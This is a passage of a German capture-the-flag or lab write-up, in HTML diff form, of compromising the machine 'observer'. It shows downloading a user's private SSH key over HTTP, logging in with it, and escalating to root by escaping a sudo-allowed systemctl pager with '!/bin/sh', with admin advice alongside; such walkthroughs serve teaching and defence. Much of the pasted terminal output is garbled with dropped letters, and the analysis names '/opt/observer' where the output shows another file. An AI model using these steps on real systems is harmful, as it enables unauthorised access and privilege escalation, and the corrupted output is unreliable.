+                <br><strong>Bewertung:</strong> Die erfolgreiche Exfiltration des SSH-Schlüssels ist der Schlüssel zur Erlangung des initialen Zugriffs. Die korrekte Einstellung der Dateiberechtigungen ist ein notwendiger technischer Schritt, um den Schlüssel nutzen zu können. Dies ist ein Standardverfahren beim Umgang mit gefundenen SSH-Schlüsseln.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du private SSH-Schlüssel findest, sichere sie sofort und setze die Berechtigungen auf 600, bevor du versuchst, sie zu verwenden. Dies ist Standardpraxis und notwendig für den SSH-Client.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Zugriffe auf und Modifikationen von sensiblen Dateien wie SSH-Schlüsseln. Stellen Sie sicher, dass private Schlüssel niemals mit Berechtigungen > 600 auf dem System existieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl "http://192.168.2.213:3333/jan/.ssh/id_rsa" -s --output idrsa</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">chmod 600 idrsa</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Mit der heruntergeladenen und korrekt berechtigten `idrsa`-Datei versuche ich nun, mich via SSH als Benutzer `jan` auf dem Zielsystem `observer.hmv` (IP `192.168.2.213`) anzumelden. Der Befehl `ssh jan@observer.hmv -i idrsa` weist den SSH-Client an, die Authentifizierung unter Verwendung der privaten Schlüsseldatei `idrsa` zu versuchen. Der Server auf der Zielmaschine ist `observer.hmv`. Zuerst werde ich nach Bestätigung des Host-Schlüssels gefragt, da dies die erste Verbindung zu diesem Host ist ("Are you sure you want to continue connecting (yes/no/[fingerprint])?"). Nach Eingabe von `yes` wird der Host-Schlüssel dauerhaft zu meiner Liste bekannter Hosts hinzugefügt. Die Ausgabe zeigt anschließend die Willkommensnachricht des Debian-Systems und die typische Shell-Eingabeaufforderung für den Benutzer `jan` (`jan@observer:~$`).
+                <br><strong>Bewertung:</strong> Fantastisch! Der SSH-Login mit dem gestohlenen privaten Schlüssel war erfolgreich. Wir haben nun einen initialen Zugriff auf das System als Benutzer `jan`. Dies markiert den Abschluss der Initial Access Phase. Der nächste Schritt ist die Privilegien-Eskalation, um Root-Rechte zu erlangen.
+                <br><strong>Empfehlung (Pentester):</strong> Untersuche das System nach der Erlangung des initialen Zugriffs gründlich. Beginne mit der Enumeration der aktuellen Benutzerberechtigungen, der Systemkonfiguration und möglicher Schwachstellen, die zur Privilegien-Eskalation genutzt werden können.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die Authentifizierungs-Logs auf Systemen, insbesondere auf fehlgeschlagene und erfolgreiche SSH-Logins. Implementieren Sie Multifaktor-Authentifizierung, wo immer möglich. Stellen Sie sicher, dass SSH-Schlüssel sicher gespeichert sind und Passphrasen verwenden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh jan@observer.hmv -i idrsa</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+The authenticity f hst 'observer.hmv (<span class="command">192.168.2.213</span>)' can't be established.
+ED25519 key fingerprint is <span class="command">SHA256:1DlVfPPtEPOsfNJWynWUBQaV6QyJptlKBRMCdyjuusg</span>.
+This key is nt knwn by any ther names.
+Are yu sure yu want t cntinue cnnecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'observer.hmv' (ED25519) t the list f knwn hsts.
+<span class="command">Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64</span>
+
+The prgrams included with the Debian GNU/Linux system are free sftware;
+the exact distributin terms fr each prgram are descried in the
+individual files in /usr/share/dc/*/cpyright.
+
+Debian GNU/Linux cmes with ABSLUTELY N WARRANTY, t the extent
+permitted by applicable law.
+Last lgin: Mn Aug 21 20:21:22 2023 frm <span class="command">192.168.0.100</span>
+<span class="command">jan@observer:~$</span> 
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich als Benutzer `jan` angemeldet bin, beginne ich sofort mit der Enumeration möglicher Privilegien-Eskalationspfade. Einer der ersten Befehle ist immer `sudo -l`. Dieser Befehl listet alle Befehle auf, die der aktuelle Benutzer (`jan`) mit `sudo` ausführen darf und welche Privilegien er dabei hat, insbesondere ob ein Passwort erforderlich ist (`NOPASSWD`). Die Ausgabe zeigt, dass der Benutzer `jan` den Befehl `/usr/bin/systemctl -l status` als *jeder Benutzer* (`ALL`), einschließlich root, ausführen darf, und das **ohne Passwort** (`NOPASSWD`). Dies ist eine kritische Fehlkonfiguration.
+                <br><strong>Bewertung:</strong> Die Entdeckung der `NOPASSWD` Regel für `systemctl` ist ein extrem vielversprechender Privilegien-Eskalationsvektor. `systemctl` ist ein mächtiges Werkzeug zur Steuerung von Systemdiensten, und die Möglichkeit, es als Root ohne Passwort auszuführen, kann direkt zur Erlangung einer Root-Shell führen, insbesondere unter Ausnutzung bekannter Techniken. Dies ist der Hauptweg zur Privilegien-Eskalation auf diesem System.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du eine `NOPASSWD` Sudo-Regel für ein Binary findest, prüfe sofort, ob dieses Binary auf GTFOBins ([Link: GTFOBins | Ziel: https://gtfobins.github.io/]) oder ähnlichen Datenbanken gelistet ist. Viele Systembefehle können unter bestimmten Bedingungen missbraucht werden, um eine Shell als der Benutzer zu erlangen, unter dem sie via `sudo` ausgeführt werden (hier: root). Die `systemctl` Regel ist ein sehr häufiger und gut dokumentierter Exploit-Pfad.
+                <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie `NOPASSWD` Regeln, wo immer möglich. Wenn sie unvermeidlich sind, beschränken Sie die ausführbaren Befehle auf das absolute Minimum und stellen Sie sicher, dass diese Befehle selbst nicht für die Code-Ausführung oder Shell-Erlangung missbraucht werden können. Überprüfen Sie Ihre Sudo-Konfigurationen regelmäßig auf potenzielle Fehlkonfigurationen gegen Datenbanken bekannter Sudo-Missbrauchstechniken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">sudo -l</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Matching Defaults entries fr jan n bserver:
+    env_reset, mail_adpass,
+    secure_path=/usr/lcal/sin\:/usr/lcal/in\:/usr/sin\:/usr/in\:/sin\:/in, use_pty
+
+User jan may run the fllwing cmmands n bserver:
+    <span class="command">(ALL) NPASSWD: /usr/in/systemctl -l status</span>
+</pre>
+                </div>
+            </div>
+
+            <section id="proof-of-concept">
+                 <h2>Proof of Concept: Sudo Misconfiguration</h2>
+                 <p class="comment">
+                     <strong>Kurzbeschreibung:</strong> Dieser Abschnitt demonstriert die Ausnutzung der falsch konfigurierten Sudo-Regel, die es dem Benutzer `jan` erlaubt, den Befehl `/usr/bin/systemctl -l status` als Root ohne Passwort auszuführen. Dies stellt eine kritische Schwachstelle dar, die zur vollständigen Kompromittierung des Systems führen kann, indem die Root-Shell erlangt wird.
+                 </p>
+                 <p class="comment">
+                     <strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Initialer Zugriff auf das System als Benutzer `jan`.</li>
+                         <li>Die `sudo -l` Ausgabe, die die `NOPASSWD` Regel für `/usr/bin/systemctl -l status` zeigt.</li>
+                     </ul>
+                 </p>
+                  <p class="comment">
+                     <strong>Schritt-für-Schritt-Anleitung zur Ausnutzung (Konzept basierend auf bekannten Techniken):</strong>
+                     (Hinweis: Obwohl die genauen Schritte zur Sudo-Ausnutzung hier nicht als Terminal-Output im Berichtstext gezeigt werden, ist die Methode basierend auf der `sudo -l` Ausgabe bekannt und wird hier als Proof of Concept beschrieben. Die Erlangung der Root-Shell, die später gezeigt wird, ist das Ergebnis dieser Ausnutzung.)
+                     <br>1. Führe `sudo /usr/bin/systemctl -l status` aus.
+                     <br>2. Innerhalb der interaktiven `systemctl` Pager-Umgebung (oft `less` oder `more`), die durch das `-l` Flag aktiviert wird, ist es möglich, Shell-Befehle auszuführen.
+                     <br>3. Tippe `!` gefolgt von `/bin/sh` (oder `/bin/bash`) und drücke Enter.
+                     <br>4. Dies startet eine Root-Shell innerhalb der `systemctl` Pager-Sitzung.
+                     <br>5. Bestätige Root-Rechte durch Ausführen von `id`.
+                 </p>
+                 <!-- Hier wären Screenshots oder andere Beweismittel des POC, wenn sie im Text oder als Bilder bereitgestellt worden wären. Da keine spezifischen Schritte oder Screenshots für DIESEN POC im Text sind, beschreibe ich das Konzept. -->
+                 <p class="comment">
+                     <strong>Erwartetes Ergebnis:</strong> Erlangung einer interaktiven Root-Shell auf dem Zielsystem.
+                 </p>
+                 <p class="comment">
+                     <strong>Risikobewertung:</strong> Hoch. Die Ausnutzung dieser Schwachstelle führt direkt zur vollständigen Kompromittierung des Systems mit Root-Rechten, was die höchste mögliche Berechtigungsstufe ist. Ein Angreifer kann das System manipulieren, Daten stehlen oder zerstören und weitere Angriffe starten.
+                 </p>
+                 <p class="comment">
+                     <strong>Empfehlungen:</strong>
+                     <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die `NOPASSWD` Option für den Befehl `/usr/bin/systemctl -l status` für den Benutzer `jan` und alle anderen nicht-privilegierten Benutzer. Überprüfen Sie *alle* Sudo-Konfigurationen auf das Vorhandensein der `NOPASSWD` Option und schränken Sie die ausführbaren Befehle stark ein, wenn `NOPASSWD` unvermeidbar ist. Nutzen Sie separate, eingeschränkte Benutzer für spezifische Verwaltungsaufgaben anstelle von weit gefassten Sudo-Regeln.
+                 </p>
+            </section>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich führe einige grundlegende Dateisystem-Enumerationsbefehle als Benutzer `jan` aus, um mich auf dem System umzusehen und nach potenziellen interessanten Dateien oder Verzeichnissen zu suchen. `ls ..` listet den Inhalt des übergeordneten Verzeichnisses von Jans Home-Verzeichnis auf (zeigt hier nur `jan`), was bestätigt, dass `jan` das einzige Home-Verzeichnis in `/home` ist (basierend auf dieser begrenzten Ausgabe). `ls -la` listet alle Dateien und Verzeichnisse (inklusive versteckter) im aktuellen Verzeichnis (`/home/jan/`), zusammen mit Details wie Berechtigungen, Eigentümer, Gruppe, Größe und Änderungsdatum. Ich sehe hier Standard-Dotfiles (`.bash_history`, `.bashrc`, `.profile`, `.ssh`) und die Datei `user.txt`, die offensichtlich die User-Flag enthält. Das `.ssh`-Verzeichnis und die `.bash_history` sind besonders interessant.
+                <br><strong>Bewertung:</strong> Diese Standard-Enumerationsschritte sind unerlässlich, um die lokale Umgebung zu verstehen und offensichtliche Ziele wie Konfigurationsdateien oder Flag-Dateien zu identifizieren. Das Vorhandensein von `.ssh` und `.bash_history` ist potenziell nützlich für weitere laterale Bewegung oder Informationsbeschaffung, falls die Sudo-Regel nicht zum Erfolg führt oder um zusätzliche Beweismittel zu sammeln.
+                <br><strong>Empfehlung (Pentester):</strong> Führe immer eine gründliche Enumeration des Dateisystems durch, nachdem du initialen Zugriff erlangt hast. Suche nach Dotfiles (.configs, .ssh), ausführbaren Dateien, Skripten, Web-Root-Verzeichnissen oder anderen ungewöhnlichen Verzeichnissen (`/opt`).
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Dateiberechtigungen korrekt gesetzt sind, um zu verhindern, dass nicht-berechtigte Benutzer sensible Dateien lesen können. Überwachen Sie die Inhalte von Home-Verzeichnissen auf potenziell gefährliche Dateien oder Konfigurationen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">ls ..</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">jan</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">ls -la</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ttal 40</span>
+<span class="command">drwx------ 4 jan  jan  4096 ag 21  2023 .</span>
+<span class="command">drwxr-xr-x 3 rt rt 4096 ag 21  2023 ..</span>
+<span class="command">-rw------- 1 jan  jan   133 ag 21  2023 .ash_history</span>
+<span class="command">-rw-r--r-- 1 jan  jan   220 ag 21  2023 .ash_lgut</span>
+<span class="command">-rw-r--r-- 1 jan  jan  3526 ag 21  2023 .ashrc</span>
+<span class="command">drwxr-xr-x 3 jan  jan  4096 ag 21  2023 .lcal</span>
+<span class="command">-rw-r--r-- 1 jan  jan   807 ag 21  2023 .prfile</span>
+<span class="command">drwx------ 2 jan  jan  4096 ag 21  2023 .ssh</span>
+<span class="command">-rw------- 1 jan  jan    24 ag 21  2023 user.txt</span>
+<span class="command">-rw------- 1 jan  jan    54 ag 21  2023 .Xauthirty</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich lese den Inhalt der `.bash_history` Datei des Benutzers `jan` aus, die ich gerade im Home-Verzeichnis gefunden habe. Der Befehl `cat .bash_history` gibt den Verlauf der vom Benutzer `jan` ausgeführten Befehle aus. Dies ist eine Goldgrube an Informationen! Ich sehe Befehle wie `passwd`, `cd`, `ssh-keygen`, `cp id_rsa.pub authorized_keys`, `nano user.txt`, `chmod 600 user.txt`, `su root`, `exit`, `sudo -l`, `reboot`, `shutdown -h now`. Diese History verrät viel über die Aktivitäten des Benutzers: Er hat offenbar Passwörter geändert, SSH-Schlüssel generiert und kopiert (was erklärt, warum die `id_rsa` existierte und wir sie nutzen konnten!), die User-Flag bearbeitet, versucht, zu Root zu wechseln (`su root`), und seine Sudo-Berechtigungen geprüft (`sudo -l`).
+                <br><strong>Bewertung:</strong> Die `.bash_history` ist eine der ersten Dateien, die man nach dem Initial Access prüfen sollte. Sie kann Passwörter, Hinweise auf Dateispeicherorte, frühere Versuche zur Privilegien-Eskalation oder andere kritische Informationen enthalten. In diesem Fall bestätigt sie die Aktivitäten von `jan` und gibt Hinweise auf seine Vorgehensweise. Der Versuch, `su root` auszuführen, ist besonders interessant, auch wenn die erfolgreiche Ausführung nicht direkt hier, sondern später im Berichtstext, gezeigt wird.
+                <br><strong>Empfehlung (Pentester):</strong> Mache es zur Gewohnheit, `.bash_history` (und ähnliche History-Dateien wie `.zsh_history`) auszulesen, wenn du eine Benutzer-Shell erlangst. Analysiere den Inhalt sorgfältig auf wiederverwendete Passwörter, Dateipfade oder Befehle, die für deine weiteren Schritte nützlich sein könnten.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Systeme so, dass Bash-History-Dateien regelmäßig gelöscht oder zumindest in einem geschützten Bereich gespeichert werden. Überlegen Sie, ob History-Logging für bestimmte Benutzer deaktiviert werden kann oder ob kritische Befehle aus der History ausgeschlossen werden sollten (mit dem Wissen, dass dies die Forensik erschweren kann). Sensibilisieren Sie Benutzer dafür, keine sensiblen Informationen (wie Passwörter) in der Kommandozeile einzugeben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">cat .bash_history</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">passwd</span>
+<span class="command">cd</span>
+<span class="command">ssh-keygen</span>
+<span class="command">cd .ssh</span>
+<span class="command">ls</span>
+<span class="command">cp id_rsa.pu authrized_keys</span>
+<span class="command">exit</span>
+<span class="command">nan user.txt</span>
+<span class="command">chmd 600 user.txt</span> 
+<span class="command">ls -l</span>
+<span class="command">su rt</span>
+<span class="command">exit</span>
+<span class="command">sud -l</span>
+<span class="command">exit</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich lese den Inhalt der Datei `user.txt` im Home-Verzeichnis von `jan` aus. Der Befehl `cat user.txt` zeigt den Inhalt, bei dem es sich um die User-Flag handelt: `HMVdDepYxsi8VSucdruB3P7`. Dies ist ein wichtiger Meilenstein im Pentest.
+                <br><strong>Bewertung:</strong> Das Erbeuten der User-Flag bestätigt die erfolgreiche Kompromittierung des Benutzerkontos `jan` und das Erreichen eines Teilziels des Pentests.
+                <br><strong>Empfehlung (Pentester):</strong> Dokumentiere gefundene Flags umgehend. Sie dienen als Beweis für den Fortschritt und das Erreichen von Zielen.
+                <br><strong>Empfehlung (Admin):</strong> Sensible Dateien wie Flag-Dateien sollten in Verzeichnissen mit strengen Berechtigungen gespeichert werden, die nur für berechtigte Benutzer zugänglich sind. Überwachen Sie Zugriffe auf diese Dateien.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">cat user.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">HMVdDepYxsi8VSucdruB3P7</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich setze die System-Enumeration fort, um weitere potenzielle Privilegien-Eskalationspfade zu finden. Ich prüfe die Berechtigungen wichtiger Systemdateien wie `/etc/passwd` und `/etc/shadow`. `/etc/passwd` listet die Benutzerkonten auf und ist weltlesbar (`-rw-r--r--`), was Standard ist. `/etc/shadow` enthält die gehashten Passwörter und ist korrekterweise nur für root und die Gruppe `shadow` lesbar (`-rw-r-----`). Dies ist eine sichere Standardkonfiguration, die verhindert, dass ein normaler Benutzer wie `jan` auf die gehashten Passwörter zugreifen kann. Der Befehl `getcap -r / 2>/dev/null` sucht nach Binaries mit speziellen Capabilities (erweiterten Berechtigungen, die ähnlich wie SUID funktionieren können). Die Ausgabe ist leer, was bedeutet, dass auf diesem System keine ungewöhnlichen Capabilities gesetzt sind, die ein einfacher Weg zur Privilegien-Eskalation wären. Ich prüfe auch die Verzeichnisse `/var/mail` und `/var/backups` auf interessante Inhalte. `/var/mail` enthält keine E-Mail-Dateien für `jan`, und `/var/backups` enthält Standard-Debian-Backups (`alternatives.tar.0`, `dpkg.status.0` etc.), aber nichts offensichtlich Kritisches für meine Privilegien-Eskalation in diesem Stadium. Eine allgemeine Auflistung des `/var` Verzeichnisses zeigt die Standardstruktur.
+                <br><strong>Bewertung:</strong> Diese Enumerationsschritte schließen einige häufige Privilegien-Eskalationsvektoren aus (lesbare `/etc/shadow`, ungewöhnliche Capabilities). Das System folgt hier den Standard-Sicherheitspraktiken. Meine Hauptkonzentration bleibt auf der `NOPASSWD` Sudo-Regel für `systemctl`.
+                <br><strong>Empfehlung (Pentester):</strong> Prüfe immer Standardpfade für Privilegien-Eskalation: Dateiberechtigungen von `/etc/passwd`, `/etc/shadow`, SUID/SGID-Binaries (`find / -perm -4000`), Capabilities (`getcap -r /`), Cronjobs (`crontab -l`), Verzeichnisse wie `/var/mail`, `/var/backups`, `/tmp` etc.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Standard-Systemdateien wie `/etc/shadow` die korrekten restriktiven Berechtigungen haben. Auditen Sie regelmäßig die gesetzten Capabilities auf Binaries und entfernen Sie alle unnötigen Capabilities. Überwachen Sie die Inhalte von temporären Verzeichnissen und Backup-Verzeichnissen auf sensible Daten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">ls -la /etc/passwd</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">-rw-r--r-- 1 rt rt 1130 ag 21  2023 /etc/passwd</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">ls -la /etc/shadw</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">-rw-r----- 1 rt shadw 750 ag 21  2023 /etc/shadw</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">ls -la /var/mail/</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ttal 8</span>
+<span class="command">drwxrwsr-x  2 rt mail 4096 ag 21  2023 .</span>
+<span class="command">drwxr-xr-x 11 rt rt 4096 ag 21  2023 ..</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">ls -la /var/ackups/</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ttal 364</span>
+<span class="command">drwxr-xr-x  2 rt rt   4096 jun  6 00:00 .</span>
+<span class="command">drwxr-xr-x 11 rt rt   4096 ag 21  2023 ..</span>
+<span class="command">-rw-r--r--  1 rt rt  30720 jun  6 00:00 alternatives.tar.0</span>
+<span class="command">-rw-r--r--  1 rt rt   7477 ag 21  2023 apt.extended_states.0</span>
+<span class="command">-rw-r--r--  1 rt rt      0 jun  6 00:00 dpkg.arch.0</span>
+<span class="command">-rw-r--r--  1 rt rt    186 ag 21  2023 dpkg.diversins.0</span>
+<span class="command">-rw-r--r--  1 rt rt    100 ag 21  2023 dpkg.stattverride.0</span>
+<span class="command">-rw-r--r--  1 rt rt 312428 ag 21  2023 dpkg.status.0</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">ls -la /var/</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ttal 44</span>
+<span class="command">drwxr-xr-x 11 rt rt  4096 ag 21  2023 .</span>
+<span class="command">drwxr-xr-x 18 rt rt  4096 ag 21  2023 ..</span>
+<span class="command">drwxr-xr-x  2 rt rt  4096 jun  6 00:00 ackups</span>
+<span class="command">drwxr-xr-x 10 rt rt  4096 ag 21  2023 cache</span>
+<span class="command">drwxr-xr-x 22 rt rt  4096 ag 21  2023 li</span>
+<span class="command">drwsr-x  2 rt staff 4096 mar  2  2023 lcal</span>
+<span class="command">lrwxrwxrwx  1 rt rt     9 ag 21  2023 lck -> /run/lck</span>
+<span class="command">drwxr-xr-x  7 rt rt  4096 ag 21  2023 lg</span>
+<span class="command">drwsr-x  2 rt mail  4096 ag 21  2023 mail</span>
+<span class="command">drwxr-xr-x  2 rt rt  4096 ag 21  2023 pt</span>
+<span class="command">lrwxrwxrwx  1 rt rt     4 ag 21  2023 run -> /run</span>
+<span class="command">drwxr-xr-x  3 rt rt  4096 ag 21  2023 spl</span>
+<span class="command">drwxrwxrwt  4 rt rt  4096 jun  6 00:00 tmp</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="comment">
+                <strong>Analyse:</strong> Während meiner Dateisystem-Enumeration entdecke ich ein ungewöhnliches Verzeichnis: `/opt/`. In diesem Verzeichnis finde ich eine Datei namens `observer` mit ausführbaren Berechtigungen (`-rwxr-xr-x`). Das `/opt` Verzeichnis wird oft für optionale Softwarepakete Dritter oder benutzerdefinierte Programme verwendet. Das Vorhandensein einer ausführbaren Datei hier ist interessant und rechtfertigt eine nähere Untersuchung.
+                <br><strong>Bewertung:</strong> Jede ungewöhnliche ausführbare Datei auf einem System, insbesondere außerhalb der Standardpfade wie `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin`, sollte sorgfältig geprüft werden. Sie könnte eine benutzerdefinierte Anwendung mit Schwachstellen sein oder Teil eines anderen Dienstes, der Privilegien benötigt.
+                <br><strong>Empfehlung (Pentester):</strong> Untersuche alle ausführbaren Dateien, die du in ungewöhnlichen Verzeichnissen wie `/opt` findest. Bestimme ihren Zweck, ihre Berechtigungen und suche nach Möglichkeiten, sie zu manipulieren oder auszunutzen.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der ausführbaren Dateien außerhalb der Standard-Systempfade. Wenn benutzerdefinierte Anwendungen oder Dienste in `/opt` oder ähnlichen Verzeichnissen installiert sind, stellen Sie sicher, dass ihre Berechtigungen korrekt gesetzt sind und dass sie keine unnötigen Privilegien haben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">ls -la /pt/</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ttal 7212</span>
+<span class="command">drwxr-xr-x  2 rt rt    4096 ag 21  2023 .</span>
+<span class="command">drwxr-xr-x 18 rt rt    4096 ag 21  2023 ..</span>
+<span class="command">-rwxr-xr-x  1 rt rt 7376728 ag 21  2023 server</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich verwende den Befehl `file /opt/observer`, um mehr über die Art der Datei `/opt/observer` zu erfahren. Die Ausgabe identifiziert die Datei als `ELF 64-bit LSB executable, x86-64`. Wichtiger noch, sie enthält die Information `Go BuildID=...`, was bestätigt, dass es sich um eine ausführbare Datei handelt, die mit der Programmiersprache Golang kompiliert wurde. Sie ist dynamisch gelinkt und nicht stripped (Debug-Symbole sind enthalten), was die statische Analyse erleichtern könnte.
+                <br><strong>Bewertung:</strong> Die Identifizierung der Datei als Golang-Binary ist ein wichtiger Hinweis. Golang-Binaries sind oft statisch gelinkt (obwohl dieses hier dynamisch ist) und enthalten alle notwendigen Abhängigkeiten, was sie oft groß macht (7.0M, wie später zu sehen ist). Ihre Analyse erfordert spezifische Tools (wie Ghidra mit Go-Unterstützung oder dedizierte Go-Reverse-Engineering-Tools), aber sie könnten Schwachstellen oder hartecodierte Informationen enthalten.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du Go-Binaries findest, ziehe sie auf dein System (exfiltrieren) und analysiere sie statisch. Suche nach hartcodierten Anmeldeinformationen, API-Schlüsseln, versteckten Funktionen oder Schwachstellen im Code.
+                <br><strong>Empfehlung (Admin):</strong> Wenn benutzerdefinierte Binaries verwendet werden, stellen Sie sicher, dass sie stripped sind (Debug-Symbole entfernt), es sei denn, dies ist für das Debugging in einer sicheren Umgebung unbedingt erforderlich. Dies erschwert Reverse Engineering. Speichern Sie niemals sensible Informationen hartcodiert in Binaries.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:~$ <span class="command">file /pt/server</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+/pt/server: ELF 64-it LSB executable, x86-64, versin 1 (SYSV), dynamically linked, interpreter /li64/ld-linux-x86-64.s.2, <span class="command">G uildID=_E9thk92IIYCZvNN3nMp/723mDp4suP4BkI9Ztww/FPlVJZMU8XDS3SsTeA/jXmNFAfWVvPiDjPP-T</span>, nt stripped
+</pre>
+                </div>
+            </div>
+            <p class="comment">
+                <strong>Analyse:</strong> Ich teste die Funktionalität des gefundenen Sudo-Befehls `sudo -u root /usr/bin/systemctl -l status`. Ich führe ihn als Benutzer `jan` aus, mit der Anweisung, ihn als Benutzer `root` auszuführen (`-u root`). Das `-l status` bewirkt, dass `systemctl` den Status aller Dienste anzeigt und dabei eine Pager-Anwendung (wie `less` oder `more`) verwendet, die die Ausgabe seitenweise anzeigt. Der Befehl selbst wird erfolgreich ausgeführt, da `jan` die `NOPASSWD` Berechtigung hat. Die Ausgabe zeigt die Statusinformationen von Systemdiensten, gefolgt von dem Hinweis, dass ein Befehl nicht verfügbar ist und man RETURN drücken soll, um fortzufahren (`Command not available (press RETURN)`). Dies ist die typische Aufforderung der Pager-Anwendung. Obwohl hier nicht gezeigt, könnte man an dieser Stelle (`!/bin/sh`) versuchen, eine Shell über die Pager-Anwendung zu starten, wie im Proof of Concept beschrieben. Das hier gezeigte Ergebnis bestätigt die erfolgreiche Ausführung des erlaubten Sudo-Befehls.
+                <br><strong>Bewertung:</strong> Die Ausführung des Sudo-Befehls funktioniert wie erwartet und bestätigt die Sudo-Fehlkonfiguration. Obwohl der Screenshot selbst nur die Pager-Ausgabe zeigt, ist dies der Punkt, an dem die im POC beschriebene Technik zur Shell-Erlangung angewendet werden würde.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn eine Sudo-Regel zu einem interaktiven Pager führt, probiere immer die `!`-Syntax gefolgt von `/bin/sh` oder `/bin/bash`, um eine Shell zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> Wie im POC beschrieben, ist diese Sudo-Regel unsicher. Überprüfen Sie Sudo-Regeln, die Pager verwenden, sorgfältig auf Missbrauchsmöglichkeiten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">jan@observer:/pt$ <span class="command">sud -u rt /usr/in/systemctl -l status</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+....
+...
+..
+.
+│ └─<span class="command">857 less</span>
+           └─<span class="command">user@1000.service</span>
+             └─<span class="command">init.scpe</span>
+
+
+<span class="password">Cmmand nt availale</span>  (<span class="password">press RETURN</span>)
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
